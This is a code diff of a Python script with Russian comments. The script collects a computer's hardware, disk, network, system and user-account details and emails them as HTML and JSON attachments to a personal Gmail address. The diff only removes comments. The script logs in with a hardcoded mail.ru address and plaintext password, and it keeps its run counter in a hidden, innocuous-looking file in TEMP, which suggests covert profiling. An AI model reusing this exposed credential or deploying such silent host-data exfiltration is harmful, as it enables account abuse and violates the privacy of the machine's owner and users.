@@ -13,9 +13,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import html  # для экранирования
 
-# ---------------------------------------------------------
-# НАСТРОЙКИ
-# ---------------------------------------------------------
+
 SENDER_EMAIL = "scriptmail_noreply@mail.ru"
 SENDER_PASSWORD = "d3IczDezeY7dkGSgtbq5"
 RECIPIENT_EMAIL = "vanja05102007@gmail.com"
@@ -23,9 +21,7 @@ RECIPIENT_EMAIL = "vanja05102007@gmail.com"
 LIMIT_FILE = os.path.join(os.environ.get('TEMP', '.'), ".sys_run_cache.json")
 MAX_RUNS_PER_HOUR = 7
 
-# ---------------------------------------------------------
-# СБОР ДАННЫХ (ПОЛНЫЙ JSON)
-# ---------------------------------------------------------
+
 def run_hw(cmd, shell=False, encoding=None):
     """Запуск команды и возврат stdout"""
     try:
@@ -582,9 +578,6 @@ def gather_all():
         "network": get_network_info()
     }
 
-# ---------------------------------------------------------
-# ФОРМИРОВАНИЕ HTML ОТЧЁТА НА ОСНОВЕ СОБРАННЫХ ДАННЫХ
-# ---------------------------------------------------------
 def generate_html_report(data):
     hostname = data['hostname']
     collected_at = data['collected_at']
@@ -606,7 +599,6 @@ def generate_html_report(data):
     memory_slots = len(ram_modules) if ram_modules else "N/A"
     motherboard['memory_slots'] = memory_slots
 
-    # Стили (скопированы из visual.txt, адаптированы)
     styles = """
     <style>
         body {
@@ -708,7 +700,7 @@ def generate_html_report(data):
     </style>
     """
 
-    # Начало HTML
+
     html_parts = []
     html_parts.append(f"""<!DOCTYPE html>
 <html lang="ru">
@@ -724,13 +716,13 @@ def generate_html_report(data):
     <p><strong>Дата сбора:</strong> {html.escape(collected_at)}</p>
 """)
 
-    # Блок "Аппаратное обеспечение"
+
     html_parts.append("""
     <div class="computer-section">
         <h3>Аппаратное обеспечение</h3>
         <div class="computer-grid">
 """)
-    # CPU
+
     html_parts.append(f"""
             <div class="computer-card">
                 <strong>Процессор</strong>
@@ -750,7 +742,7 @@ def generate_html_report(data):
                 <span>Слотов RAM: {motherboard.get('memory_slots', 'N/A')}</span>
             </div>
 """)
-    # GPU
+  
     if gpu_list:
         for idx, gpu in enumerate(gpu_list, 1):
             html_parts.append(f"""
@@ -768,7 +760,7 @@ def generate_html_report(data):
 """)
     html_parts.append("        </div>\n")
 
-    # RAM
+ 
     if ram_modules:
         html_parts.append(f"""
         <h4>Оперативная память (всего: {total_ram} GB, слотов: {memory_slots})</h4>
@@ -787,7 +779,7 @@ def generate_html_report(data):
     else:
         html_parts.append("<p>Нет данных об оперативной памяти</p>\n")
 
-    # BIOS
+
     if bios:
         html_parts.append("""
         <h4>BIOS</h4>
@@ -804,7 +796,7 @@ def generate_html_report(data):
 
     html_parts.append("    </div>\n")  # закрытие computer-section
 
-    # Блок "Накопители" (физические диски)
+
     if physical_disks:
         html_parts.append("""
     <div class="computer-section">
@@ -822,7 +814,7 @@ def generate_html_report(data):
 """)
         html_parts.append("        </div>\n    </div>\n")
 
-    # Логические тома (все)
+
     if logical_disks:
         html_parts.append("""
     <div class="computer-section">
@@ -852,7 +844,7 @@ def generate_html_report(data):
 """)
         html_parts.append("        </div>\n    </div>\n")
 
-    # Блок "Сетевые интерфейсы"
+
     if network:
         html_parts.append("""
     <div class="computer-section">
@@ -873,7 +865,7 @@ def generate_html_report(data):
 """)
         html_parts.append("        </div>\n    </div>\n")
 
-    # Блок "Система"
+
     html_parts.append(f"""
     <div class="computer-section">
         <h3>Система</h3>
@@ -894,7 +886,7 @@ def generate_html_report(data):
     </div>
 """)
 
-    # Блок "Пользователи"
+
     if users:
         html_parts.append("""
     <div class="computer-section">
@@ -913,9 +905,7 @@ def generate_html_report(data):
     html_parts.append("</div></body></html>")
     return "".join(html_parts)
 
-# ---------------------------------------------------------
-# ЛОГИКА ОГРАНИЧЕНИЙ И ОТПРАВКИ
-# ---------------------------------------------------------
+
 def check_rate_limit():
     now = time.time()
     runs = []
@@ -935,13 +925,13 @@ def send_email(data, html_content):
     msg["To"] = RECIPIENT_EMAIL
     msg["Subject"] = f"Inventory Report: {data['hostname']}"
 
-    # JSON вложение
+
     json_str = json.dumps(data, indent=4, ensure_ascii=False)
     json_attachment = MIMEText(json_str, "plain", "utf-8")
     json_attachment.add_header("Content-Disposition", "attachment", filename=f"{data['hostname']}.json")
     msg.attach(json_attachment)
 
-    # HTML вложение
+
     html_attachment = MIMEText(html_content, "html", "utf-8")
     html_attachment.add_header("Content-Disposition", "attachment", filename=f"{data['hostname']}_report.html")
     msg.attach(html_attachment)
@@ -955,9 +945,7 @@ def send_email(data, html_content):
         print(f"Ошибка отправки: {e}")
         return False
 
-# ---------------------------------------------------------
-# ЗАПУСК
-# ---------------------------------------------------------
+
 if __name__ == "__main__":
     if check_rate_limit():
         full_data = gather_all()
